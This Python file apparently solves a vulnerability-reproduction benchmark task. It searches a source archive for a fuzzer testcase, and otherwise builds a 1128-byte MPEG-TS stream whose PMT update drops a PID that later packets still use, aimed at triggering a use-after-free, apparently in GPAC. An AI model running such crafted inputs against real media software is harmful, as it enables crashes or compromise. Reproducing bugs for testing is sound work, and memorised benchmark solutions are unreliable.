import os
import io
import tarfile
import zipfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        data = self._try_find_poc_in_archive(src_path, target_size=1128)
        if data:
            return data
        return self._generate_ts_poc()

    def _try_find_poc_in_archive(self, src_path: str, target_size: int) -> bytes | None:
        candidates = []
        try:
            if os.path.isdir(src_path):
                for root, _, files in os.walk(src_path):
                    for fn in files:
                        path = os.path.join(root, fn)
                        try:
                            size = os.path.getsize(path)
                        except OSError:
                            continue
                        if size <= 0:
                            continue
                        try:
                            with open(path, 'rb') as f:
                                content = f.read()
                        except OSError:
                            continue
                        weight = self._weigh_candidate(fn, content, size, target_size)
                        if weight > 0:
                            candidates.append((weight, fn, size, content))
            elif zipfile.is_zipfile(src_path):
                with zipfile.ZipFile(src_path, 'r') as zf:
                    for info in zf.infolist():
                        if info.is_dir():
                            continue
                        size = info.file_size
                        if size <= 0:
                            continue
                        try:
                            content = zf.read(info.filename)
                        except Exception:
                            continue
                        weight = self._weigh_candidate(info.filename, content, size, target_size)
                        if weight > 0:
                            candidates.append((weight, info.filename, size, content))
            elif tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, 'r:*') as tf:
                    for m in tf.getmembers():
                        if not m.isfile() or m.size <= 0:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            content = f.read()
                        except Exception:
                            continue
                        name = m.name
                        size = len(content)
                        weight = self._weigh_candidate(name, content, size, target_size)
                        if weight > 0:
                            candidates.append((weight, name, size, content))
        except Exception:
            candidates = []
        if not candidates:
            return None
        candidates.sort(key=lambda x: (x[0], -x[2]))
        return candidates[-1][3]

    def _is_ts_stream(self, data: bytes) -> bool:
        if len(data) < 188 or (len(data) % 188) != 0:
            return False
        for i in range(0, len(data), 188):
            if data[i] != 0x47:
                return False
        return True

    def _weigh_candidate(self, name: str, content: bytes, size: int, target_size: int) -> int:
        name_l = (name or '').lower()
        weight = 0
        if size == target_size:
            weight += 1000
        if self._is_ts_stream(content):
            weight += 800
        patterns = [
            'poc', 'repro', 'clusterfuzz', 'testcase', 'oss-fuzz', 'ossfuzz',
            'uaf', 'use-after-free', 'use_after_free', 'heap', 'm2ts', 'mpegts',
            'ts', 'gpac', '372994344'
        ]
        for p in patterns:
            if p in name_l:
                weight += 50
        _, ext = os.path.splitext(name_l)
        exts_good = {'.ts', '.m2ts', '.bin', '.es', '.dat'}
        exts_bad = {'.c', '.h', '.cc', '.cpp', '.txt', '.md', '.json', '.xml', '.html', '.py'}
        if ext in exts_good:
            weight += 30
        if ext in exts_bad:
            weight -= 40
        if size < 32:
            weight -= 50
        if size > 5 * 1024 * 1024:
            weight -= 200
        return weight

    def _mpeg2_crc32(self, data: bytes) -> int:
        poly = 0x04C11DB7
        crc = 0xFFFFFFFF
        for b in data:
            crc ^= (b & 0xFF) << 24
            for _ in range(8):
                if crc & 0x80000000:
                    crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
                else:
                    crc = (crc << 1) & 0xFFFFFFFF
        return crc & 0xFFFFFFFF

    def _build_pat_section(self, program_number: int, pmt_pid: int, tsid: int = 1, version: int = 0) -> bytes:
        table_id = 0x00
        cni = 1
        section_number = 0
        last_section_number = 0
        body = bytearray()
        body += struct.pack('>H', tsid & 0xFFFF)
        body += bytes([(0xC0 | ((version & 0x1F) << 1) | (cni & 0x01))])
        body += bytes([section_number, last_section_number])
        body += struct.pack('>H', program_number & 0xFFFF)
        body += struct.pack('>H', 0xE000 | (pmt_pid & 0x1FFF))
        section_length = len(body) + 4  # CRC length
        sec_hdr = bytes([
            0xB0 | ((section_length >> 8) & 0x0F),
            section_length & 0xFF
        ])
        section_wo_crc = bytes([table_id]) + sec_hdr + bytes(body)
        crc = self._mpeg2_crc32(section_wo_crc)
        section = section_wo_crc + struct.pack('>I', crc)
        return section

    def _build_pmt_section(self, program_number: int, version: int, pcr_pid: int, streams: list) -> bytes:
        table_id = 0x02
        cni = 1
        section_number = 0
        last_section_number = 0
        body = bytearray()
        body += struct.pack('>H', program_number & 0xFFFF)
        body += bytes([(0xC0 | ((version & 0x1F) << 1) | (cni & 0x01))])
        body += bytes([section_number, last_section_number])
        body += struct.pack('>H', 0xE000 | (pcr_pid & 0x1FFF))
        body += struct.pack('>H', 0xF000 | 0x000)  # program_info_length = 0
        for stype, pid in streams:
            body += bytes([stype & 0xFF])
            body += struct.pack('>H', 0xE000 | (pid & 0x1FFF))
            body += struct.pack('>H', 0xF000 | 0x000)  # ES_info_length = 0
        section_length = len(body) + 4  # CRC
        sec_hdr = bytes([
            0xB0 | ((section_length >> 8) & 0x0F),
            section_length & 0xFF
        ])
        section_wo_crc = bytes([table_id]) + sec_hdr + bytes(body)
        crc = self._mpeg2_crc32(section_wo_crc)
        section = section_wo_crc + struct.pack('>I', crc)
        return section

    def _make_ts_packet(self, pid: int, pusi: int, payload: bytes, cc: int, use_adaptation: bool = True) -> bytes:
        header = bytearray(4)
        header[0] = 0x47
        header[1] = ((pusi & 1) << 6) | ((pid >> 8) & 0x1F)
        header[2] = pid & 0xFF
        if use_adaptation:
            afc = 3  # adaptation + payload
        else:
            afc = 1  # payload only
        header[3] = ((0 & 0x3) << 6) | ((afc & 0x3) << 4) | (cc & 0x0F)
        if use_adaptation:
            # compute adaptation length so that total = 188
            # 4 bytes header + 1 byte adapt_length + adapt_length bytes + len(payload) = 188
            adapt_len = 183 - len(payload)
            if adapt_len < 1:
                # not enough room, fallback to payload only
                return self._make_ts_packet(pid, pusi, payload, cc, use_adaptation=False)
            adaptation = bytearray(1 + adapt_len)
            adaptation[0] = adapt_len  # adaptation_field_length
            if adapt_len >= 1:
                adaptation[1] = 0x00  # flags
                for i in range(2, 1 + adapt_len):
                    adaptation[i] = 0xFF
            packet = bytes(header) + bytes(adaptation) + payload
        else:
            # payload-only
            if len(payload) > 184:
                payload = payload[:184]
            stuffing = b''
            if len(payload) < 184:
                # When payload-only, remaining bytes in payload area become part of payload.
                # For PSI, this is ok (0xFF stuffing); for PES with length 0, also ok.
                stuffing = bytes([0xFF]) * (184 - len(payload))
            packet = bytes(header) + payload + stuffing
        if len(packet) != 188:
            # Ensure size
            if len(packet) < 188:
                packet += bytes([0xFF]) * (188 - len(packet))
            else:
                packet = packet[:188]
        return packet

    def _pack_psi(self, pid: int, section: bytes, cc: int) -> bytes:
        # PSI with pointer_field = 0
        payload = bytes([0x00]) + section
        return self._make_ts_packet(pid=pid, pusi=1, payload=payload, cc=cc, use_adaptation=True)

    def _encode_pts(self, pts: int) -> bytes:
        v = pts & ((1 << 33) - 1)
        b0 = ((0x2 & 0x0F) << 4) | (((v >> 30) & 0x07) << 1) | 1
        b1 = (v >> 22) & 0xFF
        b2 = (((v >> 15) & 0x7F) << 1) | 1
        b3 = (v >> 7) & 0xFF
        b4 = ((v & 0x7F) << 1) | 1
        return bytes([b0, b1, b2, b3, b4])

    def _build_pes_start(self, stream_id: int = 0xE0, pts_val: int = 0) -> bytes:
        pes = bytearray()
        pes += b'\x00\x00\x01'
        pes += bytes([stream_id & 0xFF])
        pes += b'\x00\x00'  # PES_packet_length = 0 (unspecified for video)
        pes += b'\x80'  # '10' + flags
        pes += b'\x80'  # PTS only
        pes += b'\x05'  # header data length
        pes += self._encode_pts(pts_val)
        return bytes(pes)

    def _generate_ts_poc(self) -> bytes:
        packets = []

        # PID continuity counters
        cc = {}

        def next_cc(pid):
            val = cc.get(pid, -1) + 1
            val &= 0x0F
            cc[pid] = val
            return val

        # 1) PAT: program 1 -> PMT PID 0x0100
        pat_section = self._build_pat_section(program_number=1, pmt_pid=0x0100, tsid=1, version=0)
        packets.append(self._pack_psi(pid=0x0000, section=pat_section, cc=next_cc(0x0000)))

        # 2) PMT v0: program 1 -> stream PID 0x0101 (H.264), PCR PID 0x0101
        pmt_v0 = self._build_pmt_section(program_number=1, version=0, pcr_pid=0x0101, streams=[(0x1B, 0x0101)])
        packets.append(self._pack_psi(pid=0x0100, section=pmt_v0, cc=next_cc(0x0100)))

        # 3) PES start on PID 0x0101 (video)
        pes_hdr = self._build_pes_start(stream_id=0xE0, pts_val=0)
        pes_payload = pes_hdr + b'\x00\x00\x01\xB3' + b'\x00' * 8  # minimal sequence header-like bytes
        packets.append(self._make_ts_packet(pid=0x0101, pusi=1, payload=pes_payload, cc=next_cc(0x0101), use_adaptation=True))

        # 4) PMT v1: change to different stream PID 0x0102 (e.g., audio), remove 0x0101
        pmt_v1 = self._build_pmt_section(program_number=1, version=1, pcr_pid=0x0102, streams=[(0x03, 0x0102)])
        packets.append(self._pack_psi(pid=0x0100, section=pmt_v1, cc=next_cc(0x0100)))

        # 5) Payload on PID 0x0101 after removal (continuation)
        cont_payload1 = b'\xFF' * 10
        packets.append(self._make_ts_packet(pid=0x0101, pusi=0, payload=cont_payload1, cc=next_cc(0x0101), use_adaptation=True))

        # 6) Another payload on PID 0x0101 (may simulate dangling reference usage)
        cont_payload2 = b'\x00' * 20
        packets.append(self._make_ts_packet(pid=0x0101, pusi=0, payload=cont_payload2, cc=next_cc(0x0101), use_adaptation=True))

        blob = b''.join(packets)
        if len(blob) != 6 * 188:
            # Adjust to exact 1128 bytes by truncating or padding with null TS packets
            if len(blob) > 1128:
                blob = blob[:1128]
            else:
                # Add null TS packets with PID 0x1FFF
                while len(blob) < 1128:
                    null_pid = 0x1FFF
                    null_cc = 0
                    pkt = self._make_ts_packet(pid=null_pid, pusi=0, payload=b'', cc=null_cc, use_adaptation=True)
                    space = min(1128 - len(blob), 188)
                    blob += pkt[:space]
        return blob